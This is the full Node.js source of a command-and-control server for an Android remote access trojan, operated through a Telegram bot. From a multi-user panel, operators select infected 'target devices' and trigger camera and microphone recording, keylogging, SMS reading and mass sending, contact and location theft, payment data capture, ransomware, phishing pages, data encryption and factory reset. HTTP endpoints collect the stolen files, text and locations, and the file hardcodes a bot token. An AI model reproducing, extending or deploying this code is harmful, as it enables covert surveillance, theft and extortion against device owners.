const express = require('express');
const session = require('express-session');
const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const fs = require('fs');

// ==================== Configuration ====================
const BOT_TOKEN = process.env.BOT_TOKEN || '8401260168:AAGnO0Hg8l5PPU37yLTYAhspO3zRzBQyA-U';
const ADMIN_ID = process.env.ADMIN_ID || '7832626481'; // Admin chat ID

// ==================== Data Storage ====================
// Authorized users (Telegram chat IDs) – stored in file
let authorizedUsers = new Set();
const USERS_FILE = './users.json';
try {
    const data = fs.readFileSync(USERS_FILE);
    JSON.parse(data).forEach(id => authorizedUsers.add(id.toString()));
} catch (e) {
    authorizedUsers.add(ADMIN_ID); // default admin
    saveUsers();
}
function saveUsers() {
    fs.writeFileSync(USERS_FILE, JSON.stringify([...authorizedUsers]));
}

// userDevices: Map<userId, Map<deviceUuid, deviceInfo>>
const userDevices = new Map();
// deviceToUser: Map<deviceUuid, userId>
const deviceToUser = new Map();
// liveViewers: Map<deviceUuid, Set<WebSocket>> (browsers watching live stream)
const liveViewers = new Map();
// userSession: Map<userId, { currentUuid, currentNumber, currentTitle }>
const userSession = new Map();

// ==================== Express Setup ====================
const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: 'your-secret-key-change-this',
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 24 * 60 * 60 * 1000 } // 1 day
}));

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ==================== Telegram Bot ====================
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ==================== Multer for file uploads ====================
const upload = multer();

// ==================== Helper: Check if user authorized ====================
function isAuthorized(chatId) {
    return authorizedUsers.has(chatId.toString());
}

// ==================== Helper: Get device owner ====================
function getDeviceOwner(deviceUuid) {
    return deviceToUser.get(deviceUuid);
}

// ==================== Helper: Send command to device ====================
function sendCommandToDevice(deviceUuid, command) {
    let sent = false;
    wss.clients.forEach(ws => {
        if (ws.uuid === deviceUuid && ws.readyState === WebSocket.OPEN) {
            ws.send(command);
            sent = true;
        }
    });
    return sent;
}

// ==================== Telegram Bot Commands ====================

// Admin: Add user
bot.onText(/\/adduser (\d+)/, (msg, match) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    const newUser = match[1];
    authorizedUsers.add(newUser);
    saveUsers();
    bot.sendMessage(chatId, `✅ User ${newUser} added.`);
});

// Admin: Remove user
bot.onText(/\/removeuser (\d+)/, (msg, match) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    const user = match[1];
    if (authorizedUsers.has(user)) {
        authorizedUsers.delete(user);
        saveUsers();
        bot.sendMessage(chatId, `✅ User ${user} removed.`);
    } else {
        bot.sendMessage(chatId, `❌ User not found.`);
    }
});

// Admin: List users
bot.onText(/\/listusers/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    const users = [...authorizedUsers].join('\n');
    bot.sendMessage(chatId, `Authorized users:\n${users}`);
});

// Start command for all users
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (!isAuthorized(chatId)) {
        return bot.sendMessage(chatId, '⛔ You are not authorized. Contact admin.');
    }
    bot.sendMessage(chatId,
        '°• 🪴 Welcome to Multi-User Panel 🪴\n\n' +
        '• If the app is installed on target device, wait for connection.\n' +
        '• Use buttons below.',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                resize_keyboard: true
            }
        }
    );
});

// Handle all other messages
bot.on('message', (msg) => {
    const chatId = msg.chat.id.toString();
    if (!isAuthorized(chatId)) return;

    const text = msg.text;
    if (!text) return;

    // Initialize session for this user if not exists
    if (!userSession.has(chatId)) {
        userSession.set(chatId, { currentUuid: '', currentNumber: '', currentTitle: '' });
    }
    const session = userSession.get(chatId);

    // Handle reply-based conversations
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text || '';
        // Send SMS flow
        if (replyText.includes('°• ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴛʜᴇ sᴍs')) {
            session.currentNumber = text;
            bot.sendMessage(chatId,
                '°• Great, now enter the message you want to send to this number.\n\n' +
                '• Be careful: message will not be sent if too long.',
                { reply_markup: { force_reply: true } }
            );
            return;
        }
        if (replyText.includes('°• Great, now enter the message you want to send to this number')) {
            if (!session.currentUuid) {
                return bot.sendMessage(chatId, '❌ No device selected. Start over.');
            }
            sendCommandToDevice(session.currentUuid, `send_message:${session.currentNumber}/${text}`);
            session.currentNumber = '';
            session.currentUuid = '';
            bot.sendMessage(chatId,
                '°• ⏳ Your request is on process...',
                {
                    reply_markup: {
                        keyboard: [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        resize_keyboard: true
                    }
                }
            );
            return;
        }
        // Similarly handle other reply flows (send_message_to_all, file, delete_file, etc.)
        // For brevity, I'll add a generic handler that matches the original code's patterns.
        // You can extend similarly.

        // Example: Send message to all contacts
        if (replyText.includes('°• ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴛᴏ ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛs')) {
            if (!session.currentUuid) return;
            sendCommandToDevice(session.currentUuid, `send_message_to_all:${text}`);
            session.currentUuid = '';
            bot.sendMessage(chatId, '°• ⏳ Request sent.', {
                reply_markup: {
                    keyboard: [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    resize_keyboard: true
                }
            });
            return;
        }
        // Add other reply handlers similarly...
        // For now, we'll keep it simple; you can copy from original code and replace currentUuid with session.currentUuid etc.
    }

    // Main menu buttons
    if (text === 'ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs') {
        const devices = userDevices.get(chatId);
        if (!devices || devices.size === 0) {
            bot.sendMessage(chatId, '°• No connected devices.');
        } else {
            let msgText = '°• List of connected devices:\n\n';
            devices.forEach((info, uuid) => {
                msgText += `• Model: <b>${info.model}</b>\n` +
                    `• Battery: <b>${info.battery}</b>\n` +
                    `• Android: <b>${info.version}</b>\n` +
                    `• Brightness: <b>${info.brightness}</b>\n` +
                    `• Provider: <b>${info.provider}</b>\n\n`;
            });
            bot.sendMessage(chatId, msgText, { parse_mode: "HTML" });
        }
        return;
    }

    if (text === 'ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ') {
        const devices = userDevices.get(chatId);
        if (!devices || devices.size === 0) {
            bot.sendMessage(chatId, '°• No connected devices.');
        } else {
            const keyboard = [];
            devices.forEach((info, uuid) => {
                keyboard.push([{
                    text: info.model,
                    callback_data: `device:${uuid}`
                }]);
            });
            bot.sendMessage(chatId, '°• Select device:', {
                reply_markup: { inline_keyboard: keyboard }
            });
        }
        return;
    }
});

// Handle callback queries (device selection and command selection)
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id.toString();
    if (!isAuthorized(chatId)) {
        bot.answerCallbackQuery(query.id, { text: 'Unauthorized' });
        return;
    }
    const data = query.data;
    const [command, param] = data.split(':');

    if (command === 'device') {
        const deviceUuid = param;
        // Check if device belongs to this user
        if (getDeviceOwner(deviceUuid) !== chatId) {
            bot.answerCallbackQuery(query.id, { text: 'This device is not yours!' });
            return;
        }
        // Store selected device in session
        const session = userSession.get(chatId) || { currentUuid: '', currentNumber: '', currentTitle: '' };
        session.currentUuid = deviceUuid;
        userSession.set(chatId, session);

        const deviceInfo = userDevices.get(chatId)?.get(deviceUuid);
        if (!deviceInfo) return;

        bot.editMessageText(`°• Select command for device: <b>${deviceInfo.model}</b>`, {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🖼️ Apps', callback_data: `apps:${deviceUuid}` },
                        { text: '🚨 Device Info', callback_data: `device_info:${deviceUuid}` }
                    ],
                    [
                        { text: '📂 Get File', callback_data: `file:${deviceUuid}` },
                        { text: '👹 Delete File', callback_data: `delete_file:${deviceUuid}` }
                    ],
                    [
                        { text: '🎟️ Screenshot', callback_data: `screenshot:${deviceUuid}` },
                        { text: '👾 WhatsApp', callback_data: `whatsapp:${deviceUuid}` }
                    ],
                    [
                        { text: '🌀 Clipboard', callback_data: `clipboard:${deviceUuid}` },
                        { text: '🥎 Microphone', callback_data: `microphone:${deviceUuid}` }
                    ],
                    [
                        { text: '🔰 Main Camera', callback_data: `camera_main:${deviceUuid}` },
                        { text: '🎪 Selfie Camera', callback_data: `camera_selfie:${deviceUuid}` }
                    ],
                    [
                        { text: '🌐 Location', callback_data: `location:${deviceUuid}` },
                        { text: '🗯️ Toast', callback_data: `toast:${deviceUuid}` }
                    ],
                    [
                        { text: '📮 Get Payments', callback_data: `Settings:${deviceUuid}` },
                        { text: '☢️ Phone Reset', callback_data: `Erase_data:${deviceUuid}` }
                    ],
                    [
                        { text: '☃️ Call Logs', callback_data: `calls:${deviceUuid}` },
                        { text: '🏆 Contacts', callback_data: `contacts:${deviceUuid}` }
                    ],
                    [
                        { text: '🔒️ Vibrate', callback_data: `vibrate:${deviceUuid}` },
                        { text: '🔔 Notification', callback_data: `show_notification:${deviceUuid}` }
                    ],
                    [
                        { text: '🧊 Messages', callback_data: `messages:${deviceUuid}` },
                        { text: '🎁 Send SMS', callback_data: `send_message:${deviceUuid}` }
                    ],
                    [
                        { text: '❌ Ransomware', callback_data: `Ransomware:${deviceUuid}` },
                        { text: '✳️ Phishing Page', callback_data: `custom_phishing:${deviceUuid}` }
                    ],
                    [
                        { text: '🦞 Play Audio', callback_data: `play_audio:${deviceUuid}` },
                        { text: '☯️ Stop Audio', callback_data: `stop_audio:${deviceUuid}` }
                    ],
                    [
                        { text: '⛔ Send SMS to all contacts', callback_data: `send_message_to_all:${deviceUuid}` }
                    ],
                    [
                        { text: '🔒 Encrypt Data', callback_data: `encrypt_data:${deviceUuid}` },
                        { text: '🔓 Decrypt Data', callback_data: `decrypt_data:${deviceUuid}` }
                    ],
                    [
                        { text: '🔮 Keylogger On', callback_data: `keylogger_on:${deviceUuid}` },
                        { text: '⛽ Keylogger Off', callback_data: `keylogger_off:${deviceUuid}` }
                    ],
                ]
            },
            parse_mode: "HTML"
        });
        bot.answerCallbackQuery(query.id);
        return;
    }

    // Handle command execution
    // First, verify device ownership
    const deviceUuid = param;
    if (getDeviceOwner(deviceUuid) !== chatId) {
        bot.answerCallbackQuery(query.id, { text: 'Not your device!' });
        return;
    }

    // Simple commands that don't need further input
    const simpleCommands = ['calls', 'screenshot', 'whatsapp', 'clipboard', 'location', 'contacts', 'messages', 'vibrate', 'device_info', 'apps', 'Settings', 'Erase_data', 'Ransomware', 'custom_phishing', 'stop_audio', 'encrypt_data', 'decrypt_data', 'keylogger_on', 'keylogger_off'];
    if (simpleCommands.includes(command)) {
        sendCommandToDevice(deviceUuid, command);
        bot.deleteMessage(chatId, query.message.message_id);
        bot.sendMessage(chatId, '°• ⏳ Request sent.', {
            reply_markup: {
                keyboard: [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                resize_keyboard: true
            }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }

    // Commands that need text input (reply flow)
    if (command === 'send_message') {
        bot.editMessageText('°• Please reply the number to which you want to send the SMS', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }
    if (command === 'send_message_to_all') {
        bot.editMessageText('°• Enter the message you want to send to all contacts', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }
    if (command === 'file') {
        bot.editMessageText('°• 📮 Enter the path of the file you want to download', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }
    if (command === 'delete_file') {
        bot.editMessageText('°• 📂 Enter the path of the file you want to delete', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }
    if (command === 'microphone') {
        bot.editMessageText('°• Enter how long you want the microphone to be recorded (seconds)', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }
    if (command === 'camera_main') {
        bot.editMessageText('°• Enter how long you want the main camera to be recorded (seconds)', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }
    if (command === 'camera_selfie') {
        bot.editMessageText('°• Enter how long you want the selfie camera to be recorded (seconds)', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }
    if (command === 'toast') {
        bot.editMessageText('°• Enter the message that you want to appear on the target device', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }
    if (command === 'show_notification') {
        bot.editMessageText('°• 📮 Enter the message you want to appear as notification', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }
    if (command === 'play_audio') {
        bot.editMessageText('°• Enter the audio link you want to play', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { force_reply: true }
        });
        bot.answerCallbackQuery(query.id);
        return;
    }

    bot.answerCallbackQuery(query.id);
});

// ==================== WebSocket Server ====================
wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.split('?')[1] || '');
    const userId = urlParams.get('userId');
    const path = req.url.split('?')[0];

    // Viewer connection for live stream
    if (path === '/live') {
        const deviceId = urlParams.get('deviceId');
        const viewerUserId = urlParams.get('userId');
        if (!deviceId || !viewerUserId || getDeviceOwner(deviceId) !== viewerUserId) {
            ws.close(1008, 'Unauthorized');
            return;
        }
        // Add to live viewers
        if (!liveViewers.has(deviceId)) liveViewers.set(deviceId, new Set());
        liveViewers.get(deviceId).add(ws);
        ws.on('close', () => {
            liveViewers.get(deviceId).delete(ws);
            if (liveViewers.get(deviceId).size === 0) liveViewers.delete(deviceId);
        });
        return;
    }

    // Device connection
    if (!userId || !authorizedUsers.has(userId)) {
        ws.close(1008, 'Unauthorized');
        return;
    }

    const deviceId = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';

    ws.uuid = deviceId;
    ws.userId = userId;

    // Store device
    if (!userDevices.has(userId)) userDevices.set(userId, new Map());
    userDevices.get(userId).set(deviceId, { model, battery, version, brightness, provider, ws });
    deviceToUser.set(deviceId, userId);

    // Notify user via Telegram
    bot.sendMessage(userId,
        `°• 🤠 New device connected 🤠\n\n` +
        `• Model: <b>${model}</b>\n` +
        `• Battery: <b>${battery}</b>\n` +
        `• Android: <b>${version}</b>\n` +
        `• Brightness: <b>${brightness}</b>\n` +
        `• Provider: <b>${provider}</b>`,
        { parse_mode: "HTML" }
    );

    // Handle messages from device (like camera frames)
    ws.on('message', (data) => {
        // Check if it's a frame (binary) or text command
        if (Buffer.isBuffer(data) && data.length > 6 && data.slice(0,6).toString() === 'frame:') {
            const frameData = data.slice(6); // actual JPEG data
            const viewers = liveViewers.get(deviceId);
            if (viewers) {
                viewers.forEach(viewerWs => {
                    if (viewerWs.readyState === WebSocket.OPEN) {
                        viewerWs.send(frameData);
                    }
                });
            }
        } else {
            // Handle other device messages if needed
            console.log(`Message from device ${deviceId}: ${data}`);
        }
    });

    ws.on('close', () => {
        userDevices.get(userId)?.delete(deviceId);
        deviceToUser.delete(deviceId);
        bot.sendMessage(userId,
            `°• 😥 Device disconnected 😥\n\n` +
            `• Model: <b>${model}</b>`,
            { parse_mode: "HTML" }
        );
    });
});

// ==================== HTTP Endpoints for Device Data ====================
// These endpoints receive data from devices (file, text, location)

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const userId = req.query.userId || req.headers.userid;
    if (!userId || !authorizedUsers.has(userId)) {
        return res.status(403).send('Unauthorized');
    }
    const name = req.file.originalname;
    bot.sendDocument(userId, req.file.buffer, {
        caption: `°• File from <b>${req.headers.model || 'device'}</b>`,
        parse_mode: "HTML"
    }, { filename: name, contentType: req.file.mimetype });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    const userId = req.query.userId || req.headers.userid;
    if (!userId || !authorizedUsers.has(userId)) return res.status(403).send('Unauthorized');
    const text = req.body.text || '';
    bot.sendMessage(userId, `°• Text from <b>${req.headers.model || 'device'}</b>\n\n${text}`, { parse_mode: "HTML" });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    const userId = req.query.userId || req.headers.userid;
    if (!userId || !authorizedUsers.has(userId)) return res.status(403).send('Unauthorized');
    const lat = req.body.lat;
    const lon = req.body.lon;
    bot.sendLocation(userId, lat, lon);
    bot.sendMessage(userId, `°• Location from <b>${req.headers.model || 'device'}</b>`, { parse_mode: "HTML" });
    res.send('');
});

// ==================== Web Interface ====================

// Middleware to check login
function requireLogin(req, res, next) {
    if (!req.session.userId) return res.redirect('/login');
    next();
}

// Login page
app.get('/login', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Login</title></head>
        <body>
            <h2>Login with your Telegram ID</h2>
            <form method="POST" action="/login">
                <input type="text" name="userId" placeholder="Enter your Telegram ID" required>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
    `);
});

app.post('/login', (req, res) => {
    const { userId } = req.body;
    if (authorizedUsers.has(userId)) {
        req.session.userId = userId;
        res.redirect('/dashboard');
    } else {
        res.send('Unauthorized');
    }
});

// Dashboard
app.get('/dashboard', requireLogin, (req, res) => {
    const userId = req.session.userId;
    const devices = userDevices.get(userId) || new Map();
    let deviceList = '';
    devices.forEach((info, uuid) => {
        deviceList += `<li>${info.model} - <a href="/stream/${uuid}">Live Camera</a></li>`;
    });
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Dashboard</title></head>
        <body>
            <h1>Your Devices</h1>
            <ul>${deviceList || '<li>No devices connected</li>'}</ul>
            <a href="/logout">Logout</a>
        </body>
        </html>
    `);
});

// Logout
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

// Live stream page
app.get('/stream/:deviceId', requireLogin, (req, res) => {
    const userId = req.session.userId;
    const deviceId = req.params.deviceId;
    if (getDeviceOwner(deviceId) !== userId) {
        return res.status(403).send('Forbidden');
    }
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Live Stream</title>
            <style>
                canvas { width: 100%; max-width: 640px; border: 1px solid black; }
            </style>
        </head>
        <body>
            <h2>Live Camera</h2>
            <canvas id="canvas"></canvas>
            <script>
                const deviceId = "${deviceId}";
                const userId = "${userId}";
                const ws = new WebSocket(\`ws://\${location.host}/live?deviceId=\${deviceId}&userId=\${userId}\`);
                ws.binaryType = 'blob';
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');

                ws.onmessage = (event) => {
                    const blob = event.data;
                    const url = URL.createObjectURL(blob);
                    const img = new Image();
                    img.onload = () => {
                        canvas.width = img.width;
                        canvas.height = img.height;
                        ctx.drawImage(img, 0, 0);
                        URL.revokeObjectURL(url);
                    };
                    img.src = url;
                };

                ws.onclose = () => {
                    document.body.innerHTML += '<p>Connection closed</p>';
                };
            </script>
        </body>
        </html>
    `);
});

// API to send command from web (optional)
app.post('/api/command/:deviceId/:command', requireLogin, (req, res) => {
    const userId = req.session.userId;
    const deviceId = req.params.deviceId;
    const command = req.params.command;
    if (getDeviceOwner(deviceId) !== userId) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    const sent = sendCommandToDevice(deviceId, command);
    if (sent) {
        res.json({ status: 'sent' });
    } else {
        res.status(404).json({ error: 'Device offline' });
    }
});

// ==================== Start Server ====================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`WebSocket: ws://localhost:${PORT}`);
    console.log(`Web interface: http://localhost:${PORT}/login`);
});

// Basic route
app.get('/', (req, res) => {
    res.send('<h1>Server is running</h1>');
});
